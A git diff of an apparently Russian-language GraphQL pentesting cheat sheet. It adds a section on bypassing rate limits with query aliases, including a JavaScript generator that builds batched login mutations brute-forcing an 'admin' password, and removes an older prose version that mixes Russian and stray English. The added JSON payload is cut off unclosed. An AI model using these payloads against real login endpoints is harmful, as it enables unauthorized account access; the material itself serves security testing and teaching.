@@ -22,6 +22,7 @@
     * [Атаки пакетной обработки GraphQL](#атаки-пакетной-обработки-graphql)
         * [Пакетная обработка на основе списка JSON](#пакетная-обработка-на-основе-списка-json)
         * [Пакетная обработка на основе имени запроса](#пакетная-обработка-на-основе-имени-запроса)
+        * [Обход ограничения скорости с использованием псевдонимов](#Обход-ограничения-скорости-с-использованием-псевдонимов)
 * [Injection](#Injection)
     * [NoSQL Injection](#NoSQLi)
     * [SQL Injection](#SQLi)
@@ -427,7 +428,7 @@ fragment TypeRef on __Type {
   "message": "Cannot query field \"one\" on type \"Query\". Did you mean \"node\"?",
 }
 ```
-Вы также можно попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist/tree/main/wordlists), когда схема GraphQL API недоступна.
+Также можно попробовать подобрать известные ключевые слова, имена полей и типов с использованием словарей, таких как [Escape-Technologies/graphql-wordlist](https://github.com/Escape-Technologies/graphql-wordlist/tree/main/wordlists), когда схема GraphQL API недоступна.
 
 ## Перечисление определений типов
 
@@ -566,6 +567,23 @@ mutation {
   fourth: login(pass: 4444, username: "bob")
 }
 ```
+
+### Обход ограничения скорости с использованием псевдонимов
+
+* Создадим словарь для bruteforce:
+```js
+copy(`123456,password,12345678,qwerty...`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "admin"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("Success.");
+```
+* Конвертируем в json
+```json
+{
+  "query": "mutation { bruteforce0: login(input: {password: \"123456\", username: \"admin\"}) { token success } bruteforce1: login(input: {password: \"password\", username: \"admin\"}) { token success } bruteforce2: login(input: {password: \"12345678\", username: \"admin\"}) { token success } bruteforce3: login(input: {password: \"qwerty\", username: \"admin\"}) { token success }
+```
 # Injection
 
 > Внедрения SQL и NoSQL все еще возможны, поскольку GraphQL — это всего лишь слой между клиентом и базой данных.
@@ -644,40 +662,6 @@ curl -X POST "http://localhost:8080/graphql?embedded_submission_form_uuid=1%27%3
 
 
 
-
-Обход ограничения скорости с использованием псевдонимов
-
-Обычно объекты GraphQL не могут содержать несколько свойств с одинаковым именем. Псевдонимы позволяют обойти это ограничение, явно называя свойства, которые вы хотите вернуть из API. Вы можете использовать псевдонимы для возврата нескольких экземпляров одного и того же типа объекта в одном запросе.
-Дополнительная информация
-
-Для получения дополнительной информации о псевдонимах GraphQL см. раздел «Псевдонимы».
-
-Хотя псевдонимы предназначены для ограничения количества необходимых вызовов API, их также можно использовать для перебора конечной точки GraphQL.
-
-Многие конечные точки имеют какой-либо ограничитель скорости (rate limiter), чтобы предотвратить атаки перебором. Некоторые ограничители скорости работают на основе количества полученных HTTP-запросов, а не количества операций, выполненных с конечной точкой. Поскольку псевдонимы фактически позволяют отправлять несколько запросов в одном HTTP-сообщении, они могут обойти это ограничение.
-
-Упрощенный пример ниже показывает серию запросов с псевдонимами, проверяющих, действительны ли скидочные коды магазина. Эта операция потенциально может обойти ограничение скорости, поскольку это один HTTP-запрос, даже though it could potentially be used to check a vast number of discount codes at once.
-graphql
-
-# Запрос с псевдонимами
-query isValidDiscount($code: Int) {
-    isValidDiscount(code:$code){
-        valid
-    }
-    isValidDiscount2: isValidDiscount(code:$code){
-        valid
-    }
-    isValidDiscount3: isValidDiscount(code:$code){
-        valid
-    }
-}
-
-text
-
-ЛАБОРАТОРНАЯ
-PRACTITIONER
-Обход защит от перебора GraphQL
-Не решена
 
 # CSRF в GraphQL
 
